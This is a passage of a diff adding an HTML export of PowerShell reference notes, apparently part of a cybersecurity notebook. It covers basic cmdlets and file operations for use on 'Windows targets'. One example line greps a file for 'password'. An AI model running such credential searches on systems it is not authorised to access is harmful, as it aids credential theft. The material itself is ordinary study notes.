@@ -1,0 +1,1503 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2026-07-20 Mon 14:09 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>PowerShell</title>
+<meta name="author" content="termux" />
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" href="style.css" type="text/css"/>
+<style type='text/css'>
+<!--/*--><![CDATA[/*><!--*/
+/* nice-org-html.css
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+*/
+
+/* basic layout ***************************************************************/
+*,
+*::before,
+*::after {
+    box-sizing: border-box;
+}
+html {
+    font-family: Sans;
+    line-height: 1.3;
+    font-size: calc(15px + 0.390625vw);
+    -webkit-text-size-adjust: 100%;
+}
+
+body {
+    background: #999; /* overwritten with theme --bg */
+    width: 100%;
+    min-height: 100vh;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family:
+	-apple-system,
+	BlinkMacSystemFont,
+	segoe ui,
+	Roboto,
+	Oxygen,
+	Ubuntu,
+	Cantarell,
+	open sans,
+	helvetica neue,
+	sans-serif,
+	system-ui
+}
+
+#preamble,
+#postamble {
+    width: 100%;
+}
+
+#content {
+    width: 80%;
+    max-width: 80ch;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    flex: 1;
+}
+
+/* custom facing **************************************************************/
+/* The variable values are injected by CSS pre-processing in et-org-html.el */
+:root {
+    --bc-tb: #000000;
+    --bc-block: #595959;
+    --clr: #000000;
+    --clr-tb-hd: #000000;
+    --clr-code: #000000;
+    --bg: #fbf7f0;
+    --bg-code: #cab9b2;
+    --bg-tb-hd: #cab9b2;
+    --bg-block: #efe9dd;
+    --clr-link: #531ab6;
+    --clr-title: #000000;
+    --clr-todo: #00598b;
+    --bg-todo: initial;
+    --clr-done: #7f0000;
+    --bg-done: initial;
+    --ts-clr: #0031a9;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #0031a9;
+    --bg-constant: initial;
+    --clr-constant: #531ab6;
+    --bg-comment: initial;
+    --clr-comment: #7f0000;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #7f0000;
+    --bg-function: initial;
+    --clr-function: #602938;
+    --bg-variable: initial;
+    --clr-variable: #00603f;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #894000;
+    --bg-doc: initial;
+    --clr-doc: #304463;
+    --bg-builtin: initial;
+    --clr-builtin: #721045;
+    --bg-string: initial;
+    --clr-string: #00598b;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+body[data-mode='light'] {
+    background: var(--bg);
+    color: var(--clr);
+}
+
+body[data-mode='dark'] {
+    background: var(--bg);
+    color: var(--clr);
+    --bc-tb: #ffffff;
+    --bc-block: #989898;
+    --clr: #ffffff;
+    --clr-code: #ffffff;
+    --clr-tb-hd: #ffffff;
+    --bg: #0d0e1c;
+    --bg-tb-hd: #484d67;
+    --bg-code: #484d67;
+    --bg-block: #1d2235;
+    --clr-link: #b6a0ff;
+    --clr-title: #ffffff;
+    --clr-todo: #2fafff;
+    --bg-todo: initial;
+    --clr-done: #ef8386;
+    --bg-done: initial;
+    --ts-clr: #79a8ff;
+    --mg: 20px;
+    --w-toc: 300px;
+    --bg-keyword: initial;
+    --clr-keyword: #79a8ff;
+    --bg-constant: initial;
+    --clr-constant: #b6a0ff;
+    --bg-comment: initial;
+    --clr-comment: #ef8386;
+    --bg-comment-delimiter: initial;
+    --clr-comment-delimiter: #ef8386;
+    --bg-function: initial;
+    --clr-function: #f78fe7;
+    --bg-variable: initial;
+    --clr-variable: #4ae2f0;
+    --bg-preprocessor: initial;
+    --clr-preprocessor: #ff7f86;
+    --bg-doc: initial;
+    --clr-doc: #9ac8e0;
+    --bg-builtin: initial;
+    --clr-builtin: #feacd0;
+    --bg-string: initial;
+    --clr-string: #2fafff;
+    --clr-note: #0969da;
+    --clr-tip: #1a7f37;
+    --clr-important: #8250df;
+    --clr-warning: #9a6700;
+    --clr-caution: #cf222e;
+}
+
+/* exceptions for badly rendering themes **************************************/
+body[data-theme='leuven'],
+body[data-theme='leuven-dark'] {
+    --bg-code: var(--bg-block);
+}
+
+/* ootb page layout ***********************************************************/
+#view-controls {
+    position: sticky;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    top: 0;
+    left: 0;
+    width: 100%;
+    background: var(--bg);
+    color: var(--clr-code);
+    height: 2.5rem;
+    padding-top: 1.25rem;
+    padding-bottom: 1.25rem;
+    z-index: 100;
+    border-radius: 5px; /* Rounded corners */
+}
+#toggle-mode {
+    position: absolute;
+    right: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#goto-top {
+    display: none;
+}
+#goto-top[data-show="true"] {
+    position: relative;
+    display: block;
+    text-align: center;
+    font-size: 1rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+#toggle-toc {
+    display: none;
+}
+#toggle-toc[data-show="true"] {
+    position: absolute;
+    left: 5%;
+    display: block;
+    text-align: center;
+    font-size: 1.5rem;
+    background: var(--bg);
+    color: var(--clr-code);
+    padding: 0.25rem 0;
+}
+
+#toggle-toc:hover,
+#goto-top:hover,
+#toggle-mode:hover {
+    cursor: pointer;
+}
+
+#table-of-contents {
+    display: none;
+}
+#table-of-contents[data-show="true"] {
+    width: 80%;
+    max-width: 80rem;
+    margin-left: 1rem;
+    margin-right: 1rem;
+    background: var(--bg);
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+
+#table-of-contents::-webkit-scrollbar {
+    display: none;
+}
+
+body[data-toc="true"] #content * {
+    display: none;
+}
+body[data-toc="true"] #content #table-of-contents,
+body[data-toc="true"] #content #table-of-contents * {
+    display: block;
+}
+
+
+/* misc elements **************************************************************/
+
+hr {
+    height: 0;
+    color: inherit;
+}
+
+b,
+strong {
+    font-weight: bolder;
+}
+
+code,
+kbd,
+samp,
+pre {
+    font-family:
+	Menlo,
+	ui-monospace,
+	SFMono-Regular,
+	Consolas,
+	'Liberation Mono',
+	monospace;
+}
+
+small {
+    font-size: 80%;
+}
+
+sub,
+sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+}
+
+sub {
+    bottom: -0.25em;
+}
+
+sup {
+    top: -0.5em;
+}
+
+table {
+    text-indent: 0;
+    border-color: inherit;
+}
+
+summary {
+    display: list-item;
+}
+
+h1 {
+    color: var(--clr-title);
+    text-align: center;
+}
+h2 {
+    margin-top: 2rem;
+    margin-bottom: 1rem;
+}
+
+code {
+    color: var(--clr-code);
+    background: var(--bg-code);
+    border-radius: 2px;
+    padding-left: 5px;
+    padding-right: 5px;
+}
+
+pre::-webkit-scrollbar {
+    display: none;
+}
+
+.todo {
+    color: var(--clr-todo);
+    background: var(--bg-todo);
+}
+
+.done {
+    color: var(--clr-done);
+    background: var(--bg-done);
+}
+
+.timestamp-wrapper {
+    font-size: 0.8rem;
+    color: var(--clr-ts);
+}
+
+table {
+    width: 100%;
+    border: 2px solid var(--bc-tb);
+}
+
+thead {
+    color: var(--clr-tb-hd);
+    background: var(--bg-tb-hd);
+}
+
+td, th {
+    border: thin solid var(--bc-tb);
+}
+
+li {
+    margin-top: 0.5rem;
+    margin-bottom: 0.5rem;
+}
+#text-table-of-contents li a:before {
+    content: "• "
+}
+
+a {
+    text-decoration: none;
+    color: var(--clr-link);
+}
+
+a:hover {
+    text-decoration: underline;
+}
+
+.MathJax_Display {
+    font-size: 1.25em;
+}
+
+img {
+    max-width: 100%;
+}
+
+pre {
+    padding: 1rem;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-block);
+    font-size: 0.9rem;
+    overflow-x: auto;
+    -ms-overflow-style: none;
+    scrollbar-width: thin;
+}
+
+.org-src-wrapper {
+    position: relative;
+    border: 1px solid var(--bc-block);
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+}
+
+.org-src-bar {
+    position: relative;
+    top: 0rem;
+    width: 100%;
+    background: var(--bg-code);
+    border-radius: 0.5rem;
+    text-align: right;
+    min-height: 1rem;
+}
+
+.org-src-wrapper .org-src-container {
+    position: relative;
+    border: none;
+    border-radius: 0.5rem;
+    background: var(--bg-code);
+    z-index: 0;
+}
+
+.org-src-wrapper .org-src-container pre.src {
+    border: none !important;
+    background: var(--bg-code) !important;
+    padding-top: 0rem;
+    padding-bottom: 0rem;
+    margin-top: 0rem;
+    margin-bottom: 0rem;
+    padding-bottom: 1.6rem;
+}
+
+.org-src-wrapper .org-src-bar .srcLangLabel {
+    top: 0rem;
+    right: 1.6rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    font-size: 0.8rem;
+    opacity: 0.5;
+    z-index: 1;
+    display: none;
+}
+
+.org-src-wrapper .org-src-bar .copyBtn {
+    top: 0rem;
+    right: 0.1rem;
+    background-color: transparent;
+    color: var(--clr-doc);
+    border: none;
+    padding: 0.5rem;
+    padding-right: 0.7rem;
+    padding-bottom: 0.3rem;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 0.8rem;
+    cursor: pointer;
+    opacity: 0.5;
+    z-index: 1;
+    transition: opacity 0.3s;
+}
+
+.org-src-wrapper .copyBtn:hover {
+    opacity: 1;
+}
+
+.org-src-wrapper .copyBtn i {
+    margin-right: 0.5rem;
+    padding: 0.5rem;
+}
+
+.admonition {
+    margin: 0.2rem;
+    color: inherit;
+    border-left: .25rem solid;
+}
+.admonition-title {
+    margin: 0 0 0.5rem 0.5rem;
+    padding: 0.5rem 0 0 0;
+    display: flex;
+    align-items: center;
+}
+.admonition-content > p {
+    margin: 0.5rem 0 0 0.5rem;
+    padding: 0 0 0.5rem 0;
+}
+
+.admonition.note {
+    border-left-color: var(--clr-note);
+}
+.admonition-title.note {
+    color: var(--clr-note);
+}
+.admonition-title.note:before {
+    content: '';
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-note);
+    mask-size: cover;    
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path class="admonition-icon-note" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8Zm8-6.5a6.5 6.5 0 1 0 0 13 6.5 6.5 0 0 0 0-13ZM6.5 7.75A.75.75 0 0 1 7.25 7h1a.75.75 0 0 1 .75.75v2.75h.25a.75.75 0 0 1 0 1.5h-2a.75.75 0 0 1 0-1.5h.25v-2h-.25a.75.75 0 0 1-.75-.75ZM8 6a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+.admonition-icon-note {
+    fill: var(--clr-note);
+}
+
+.admonition.tip {
+    border-left-color: var(--clr-tip);
+}
+.admonition-title.tip {
+    color: var(--clr-tip);
+}
+.admonition-title.tip:before {
+    content: '';
+    fill: var(--clr-tip);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-tip);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M8 1.5c-2.363 0-4 1.69-4 3.75 0 .984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75 0 0 1-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456 0 0 0-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863 0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751 0 0 1-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304 0-2.06-1.637-3.75-4-3.75ZM5.75 12h4.5a.75.75 0 0 1 0 1.5h-4.5a.75.75 0 0 1 0-1.5ZM6 15.25a.75.75 0 0 1 .75-.75h2.5a.75.75 0 0 1 0 1.5h-2.5a.75.75 0 0 1-.75-.75Z"></path></svg>');    
+}
+
+.admonition.important {
+    border-left-color: var(--clr-important);
+}
+.admonition-title.important {
+    color: var(--clr-important);
+}
+.admonition-title.important:before {
+    content: '';
+    fill: var(--clr-important);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-important);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v9.5A1.75 1.75 0 0 1 14.25 13H8.06l-2.573 2.573A1.458 1.458 0 0 1 3 14.543V13H1.75A1.75 1.75 0 0 1 0 11.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25Zm7 2.25v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 9a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');    
+}
+
+.admonition.warning {
+    border-left-color: var(--clr-warning);
+}
+.admonition-title.warning {
+    color: var(--clr-warning);
+}
+.admonition-title.warning:before {
+    content: '';
+    color: var(--clr-warning);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-warning);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path></svg>');
+}
+
+
+.admonition.caution {
+    border-left-color: var(--clr-caution);
+}
+.admonition-title.caution {
+    color: var(--clr-caution);
+}
+.admonition-title.caution:before {
+    content: '';
+    fill: var(--clr-caution);    
+    display: inline-block;
+    margin-right: 0.5rem;
+    width: 1rem;
+    height: 1rem;
+    background-color: var(--clr-caution);
+    mask-size: cover;
+    mask-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="false"><path d="M4.47.22A.749.749 0 0 1 5 0h6c.199 0 .389.079.53.22l4.25 4.25c.141.14.22.331.22.53v6a.749.749 0 0 1-.22.53l-4.25 4.25A.749.749 0 0 1 11 16H5a.749.749 0 0 1-.53-.22L.22 11.53A.749.749 0 0 1 0 11V5c0-.199.079-.389.22-.53Zm.84 1.28L1.5 5.31v5.38l3.81 3.81h5.38l3.81-3.81V5.31L10.69 1.5ZM8 4a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 4Zm0 8a1 1 0 1 1 0-2 1 1 0 0 1 0 2Z"></path></svg>');    
+}
+/* responsive layouts *********************************************************/
+
+@media only screen and (max-width: 768px) {
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+@media only screen and (max-width: 480px) {
+    #view-controls {
+	padding-top: 1.5em;
+	padding-bottom: 1.5em;
+    }
+    #toggle-toc[data-show='true'] {
+	padding-right: 5%;
+    }
+    #toggle-mode {
+	padding-left: 5%;
+    }
+    #content {
+	width: 90%;
+    }
+}
+
+
+/* generated header and footer ************************************************/
+
+#generated-header,
+#generated-footer {
+    width: 90%;
+    margin-left: 5%;
+    margin-right: 5%;
+    line-height: 1;
+}
+.generated header {
+    top: 0;
+    left: 0;
+}
+.generated footer {
+    bottom: 0;
+    left: 0;
+}
+.generated header a,
+.generated footer a {
+    display: inline;
+    color: var(--clr-title);
+    text-decoration: none;
+    transition: color .15s ease-in;
+}
+.generated header a:hover,
+.generated footer a:hover {
+    color: var(--clr-link);
+}
+
+.generated header nav {
+    position: relative;
+    margin-top: 1rem;
+    top: 0;
+    left: 0;
+}
+.generated footer nav {
+    position: relative;
+    bottom: 0;
+    left: 0;
+}
+
+.generated .separator {
+    display: block;
+    width: 111%;
+    margin-left: -5.5%;
+    max-width: 100vw;
+    height: 0.125rem;
+    background: var(--bg-code);
+}
+
+.generated a .nav-title,
+.generated a .nav-author {
+    display: inline;
+    margin-top: 1rem;
+    margin-bottom: 1rem;
+    padding-right: 10rem;
+}
+
+.generated .nav-title {
+    letter-spacing: .075rem;
+    font-weight: 500;
+}
+
+.generated .nav-toggle {
+    display: none;
+}
+.generated .nav-button {
+    display: none;
+}
+.generated .nav-list {
+    overflow-y: hidden;
+    display: block;
+    float: right;
+    list-style: none;
+    margin-bottom: 0;
+    margin-top: 0;
+}
+
+.generated .nav-item {
+    position: relative;
+    float: left;
+    margin: 0;
+}
+.generated .nav-link {
+    position: relative;
+    float: right;
+    margin-left: 2rem;
+    margin-right: 0rem;
+}
+
+.generated .nav-toggle {
+    max-height: 0;
+    visibility: hidden;
+    overflow-y: hidden;
+}
+
+.generated header .separator {
+    margin-top: 1rem;
+    margin-bottom: 0;
+}
+
+.generated footer .separator {
+    margin-bottom: 1rem;
+    margin-top: 0;
+}
+
+.generated .menu-sep {
+    display: none;
+    max-height: 0;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+
+.generated footer {
+    padding-bottom: 1rem;
+}
+
+.generated.compact footer {
+    padding-bottom: 0;
+}
+
+.generated.compact header .separator {
+    margin-top: 0;
+    margin-bottom:0;
+}
+.generated.compact footer .separator {
+    margin-bottom: 1rem;
+}
+
+.generated.compact .nav-toggle {
+    visibility: visible;
+}
+
+.generated.compact .nav-toggle + label span::before {
+    transition: all 0.2s ease-in;
+}
+.generated.compact .nav-toggle:checked + label span::before {
+    transform: translateX(0.04rem) translateY(-0.25rem) rotate(90deg);
+    transition: all 0.2s ease;
+}
+
+.generated.compact .menu-sep {
+    display: flex;
+    max-height: 0rem;
+}
+.generated.compact .nav-toggle:checked + label + .menu-sep {
+    display: block;
+    position: relative;
+    max-height: 1rem;
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-list {
+    float: none !important;
+    position: relative;
+    display: block;
+    padding-left: 0;
+    padding-right: 0;
+    z-index: 5;
+    width: 100%;
+    height: auto;
+    max-height: 0;
+    margin: 0;
+    overflow-x: hidden;
+    overflow-y: hidden;
+    transition: max-height 0.2s ease;
+}
+.generated.compact .nav-toggle:checked + label ~ .nav-list {
+    display: block;
+    max-height: 100rem;
+    overflow-y: hidden;
+}
+.generated.compact header .nav-toggle:checked + label ~ .nav-list {
+    transition: max-height 0.2s ease;
+}
+
+.generated.compact .nav-button {
+    display: inline;
+    position: relative;
+    float: right;
+    font-size: 1rem;
+}
+.generated.compact .nav-button span::before {
+    display: inline-block;
+    content: '\2807';
+    font-size: 2rem;
+    transform: translateX(0.25rem) translateY(-0.5rem);
+}
+
+.generated.compact .nav-item {
+    float: none !important;
+    text-align: center !important;
+}
+.generated.compact .nav-link {
+    line-height: 2rem;
+    margin-left: 2rem;
+    margin-right: 2rem;
+    float: none !important;
+}
+
+.generated.compact footer .separator.menu-sep {
+    margin-bottom: -1rem;
+}
+
+.hidden {
+    display: none;
+}
+
+.collapsible:hover {
+    cursor: pointer;
+}
+
+.collapsible.collapsed::after {
+    display: inline-block;
+    content: '...';
+}
+/*]]>*/-->
+</style>
+</head>
+<body>
+<div id="preamble" class="status">
+<div id='view-controls'><div id='toggle-mode' title='Mode'>&#9788;</div><div id='goto-top' title='Top'>&#8963;</div><div id='toggle-toc' title='Contents'>&#9776;</div></div>
+</div>
+<div id="content" class="content">
+<h1 class="title">PowerShell</h1>
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#orgd4316a5">Core Concepts</a></li>
+<li><a href="#org420a25c">Navigation and File System</a></li>
+<li><a href="#org8c529c8">Process and Service Management</a></li>
+<li><a href="#org4be024d">Networking</a></li>
+<li><a href="#org74c55c8">Remote Management</a></li>
+<li><a href="#org6d4f1e6">User and Group Management</a></li>
+<li><a href="#orgea032a8">Registry</a></li>
+<li><a href="#org829a4bf">Useful One-Liners</a></li>
+<li><a href="#orga545f1e">Event Log Queries</a></li>
+<li><a href="#orgbd367ee">Tips</a></li>
+</ul>
+</div>
+</div>
+<p>
+Microsoft's task automation shell and scripting language. Built
+on .NET — cmdlets return objects rather than text, making data
+manipulation significantly more powerful than cmd.exe. PowerShell
+7+ (cross-platform, open source) is distinct from Windows
+PowerShell 5.1 (built into Windows). Most security work and
+administration uses 5.1 on Windows targets.
+</p>
+
+<p>
+Related: <a href="../org/20260206T060445--core-windows-processes__cybersecurity.html">Core Windows Processes</a>
+         <a href="../org/20260206T060740--windows-event-logs__concept_cybersecurity.html">Windows Event Logs</a>
+         <a href="../org/20260314T005758--windows-privilege-escalation__concept_cybersecurity.html">Windows Privilege Escalation</a>
+         <a href="../org/20260617T103542--evil-winrm__cybersecurity_tool.html">evil-winrm</a>
+</p>
+<div id="outline-container-orgd4316a5" class="outline-2">
+<h2 id="orgd4316a5">Core Concepts</h2>
+<div class="outline-text-2" id="text-orgd4316a5">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_91ca295147af4f9dbe722599e26b0618>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_91ca295147af4f9dbe722599e26b0618=document.querySelector('button[name=btn_91ca295147af4f9dbe722599e26b0618]');
+copyBtnbtn_91ca295147af4f9dbe722599e26b0618.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Cmdlet format: Verb-Noun\nGet-Process\nStop-Service -Name \"wuauserv\"\n\n# Pipeline — pass objects between cmdlets\nGet-Process | Where-Object {$_.CPU -gt 100} | Select-Object Name, CPU\n\n# Get help\nGet-Help Get-Process\nGet-Help Get-Process -Examples\nGet-Command *service*         # find cmdlets matching a pattern\n\n# Aliases (common Linux equivalents)\nls   # Get-ChildItem\ncd   # Set-Location\ncat  # Get-Content\nps   # Get-Process\nkill # Stop-Process\n`);copyBtnbtn_91ca295147af4f9dbe722599e26b0618.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_91ca295147af4f9dbe722599e26b0618.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Cmdlet format: Verb-Noun
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Stop-Service</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Name</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"wuauserv"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Pipeline &#8212; pass objects between cmdlets
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span> | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Where-Object</span> {<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">$_</span>.CPU <span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">-gt</span> 100} | <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Select-Object</span> Name, CPU
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Get help
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Help</span> <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Help</span> <span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Process</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Examples</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Command</span> *service*         <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># find cmdlets matching a pattern
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Aliases (common Linux equivalents)
+</span>ls   <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Get-ChildItem
+</span>cd   <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Set-Location
+</span>cat  <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Get-Content
+</span>ps   <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Get-Process
+</span>kill <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># Stop-Process</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org420a25c" class="outline-2">
+<h2 id="org420a25c">Navigation and File System</h2>
+<div class="outline-text-2" id="text-org420a25c">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>POWERSHELL</span><button class='copyBtn' name=btn_eaef52a8510b42d7b0fa38cfb480ebb9>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_eaef52a8510b42d7b0fa38cfb480ebb9=document.querySelector('button[name=btn_eaef52a8510b42d7b0fa38cfb480ebb9]');
+copyBtnbtn_eaef52a8510b42d7b0fa38cfb480ebb9.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Navigation\nSet-Location C:\\Users\nGet-Location                  # pwd equivalent\n\n# List directory\nGet-ChildItem\nGet-ChildItem -Recurse -Filter \"*.config\"\nGet-ChildItem -Hidden         # show hidden files\n\n# File operations\nCopy-Item file.txt C:\\Temp\\\nMove-Item file.txt C:\\Temp\\file_moved.txt\nRemove-Item file.txt\nRemove-Item C:\\Temp\\ -Recurse -Force\nNew-Item -ItemType Directory -Path C:\\Temp\\NewFolder\nNew-Item -ItemType File -Path C:\\Temp\\new.txt\n\n# Read / write files\nGet-Content C:\\file.txt\nSet-Content C:\\file.txt \"content\"\nAdd-Content C:\\file.txt \"append this\"\nGet-Content C:\\file.txt | Select-String \"password\"  # grep equivalent\n`);copyBtnbtn_eaef52a8510b42d7b0fa38cfb480ebb9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_eaef52a8510b42d7b0fa38cfb480ebb9.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-powershell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Navigation
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Set-Location</span> C:\Users
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-Location</span>                  <span style="color: var(--clr-comment); background-color: var(--bg-comment);"># pwd equivalent
+</span>
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">List directory
+</span><span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ChildItem</span>
+<span style="color: var(--function-clr-name); background-color: var(--function-bg-name);">Get-ChildItem</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Recurse</span> <span style="color: var(--clr-constant); background-color: var(--bg-constant);">-Filter</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">"*.config"</span>
